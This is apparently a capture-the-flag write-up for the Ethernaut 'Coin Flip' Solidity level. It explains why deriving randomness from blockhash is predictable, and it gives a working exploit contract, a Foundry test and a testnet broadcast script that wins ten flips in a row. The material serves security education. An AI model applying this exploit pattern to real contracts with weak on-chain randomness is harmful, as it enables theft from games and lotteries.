## 👾 03. Coin Flip



<br>


### tl; dr

<br>


* in this challenge, we exploit the determinism of a pseudo-random function composed uniquely of an EVM global accessible variable (`blockhash`) and no added entropy.

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/63de48b2-4c5a-4499-b054-7fcd4a2a520d">
</p>



<br>

```solidity
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


<br>

---

### discussion

<br>


* the EVM is a deterministic turing machine. 
  - since it has no inherent randomness and as everything in the contracts is publicly visible (*e.g.*, `block.timestamp`, `block.number`), generating random numbers in solidity is non-trivial.
  - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.

<br>

* the `CoinFlip` contract uses the current block's `blockhash` to determine the side of a coin, represented by a `bool` variable named `coinFlip`:

<br>

```solidity
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

<br>

* which is derived from the variable `blockValue` as a `uint256` generated from the previous block number (block's number minus 1):

<br>

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

<br>

* this `FACTOR` variable is useless. 
  - first, division by a large constant does not introduce any randomness entropy at all. 
  - second, even if this constant is private, it's still available at etherscan or by decompiling the bytecode (if the contract is not verified).

<br>

```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

<br>

* the "randomness" in this contract is calculated from on-chain deterministic data, so all we need to do is simulate `side` before we submit a guess, and repeat this ten times.

<br>

```solidity
if (side == _guess) {
    consecutiveWins++;
    return true;
} else {
    consecutiveWins = 0;
    return false;
}
```



<br>

* for this simulation, we leverage **[foundry's `vm.roll(uint256)`](https://book.getfoundry.sh/cheatcodes/roll?highlight=vm.roll#examples)**, which simulates the `block.number` given by the `uint256`.


<br>


----

### solution

<br>


* our exploit is located at `src/03/CoinFlipExploit.sol`:

<br>

```solidity
contract CoinFlipExploit {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastBlockValue;

    function run(CoinFlip level) public {
        uint256 blockNumber = uint256(blockhash(block.number - 1));
        if (blockNumber == lastBlockValue) {
            return;
        }
        uint256 coinFlip = blockNumber / FACTOR;
        bool coinSide = coinFlip == 1 ? true : false;
        level.flip(coinSide);
        lastBlockValue = blockNumber;
    }
}
```

<br>

* which can be tested with `test/03/CoinFlip.t.sol`:

<br>

```solidity
contract CoinFlipTest is Test {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 private immutable FIRST_BLOCK = 137;
    uint8 consecutiveWins = 10;
    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 
    CoinFlip public level;

    function setUp() public {
        vm.prank(instance);
        level = new CoinFlip();
        assertEq(level.consecutiveWins(), 0);
    }

    function testCoinFlipHack() public {
        vm.startPrank(hacker);
        vm.roll(FIRST_BLOCK);

        CoinFlipExploit exploit = new CoinFlipExploit();
        for (uint256 i = FIRST_BLOCK; i < FIRST_BLOCK + consecutiveWins; i++) {
            vm.roll(i + 1); 
            exploit.run(level);
        }

        assert(level.consecutiveWins() == consecutiveWins);
        vm.stopPrank();
      }
}
```

<br>

* running with:

<br>

```shell
> forge test --match-contract CoinFlipTest -vvvv    
```



<br>



* to submit the solution, we run `script/03/CoinFlip.s.sol`:

<br>

```solidity
contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 private immutable consecutiveWins = 10;
    address instance = vm.envAddress("INSTANCE_LEVEL3"); 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    

    function run() public {
        vm.startBroadcast(hacker);

        CoinFlip level = CoinFlip(instance);
        CoinFlipExploit exploit = new CoinFlipExploit();
        
        vm.roll(block.number - consecutiveWins);
        
        for (uint256 i = 1; i < consecutiveWins + 1; i++) {
            uint256 lastBlockNumber = block.number;
            vm.roll(lastBlockNumber + 1);
            exploit.run(level);
        }

        console.log(level.consecutiveWins());

        vm.stopBroadcast();
    }
}
```

<br>

* with:

<br>

```shell
> forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia
```



<br>

----


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



